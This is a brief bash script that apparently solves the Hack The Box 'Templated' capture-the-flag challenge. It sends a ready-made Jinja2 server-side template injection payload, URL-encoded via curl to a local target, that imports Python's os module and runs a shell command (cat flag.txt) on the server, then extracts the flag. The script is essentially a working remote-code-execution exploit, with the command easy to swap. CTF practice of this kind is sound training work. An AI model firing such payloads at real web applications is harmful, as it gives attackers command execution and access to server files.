#!/bin/bash
# https://app.hackthebox.com/challenges/Templated
# Tags: Server-side template injection, SSTI, Python, Jinja2

TARGET=127.0.0.1:1337
SSTI="{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}"
FLAG=$(curl -s "http://$TARGET/$(echo -n $SSTI | jq -sRr @uri)" | grep -oP 'HTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"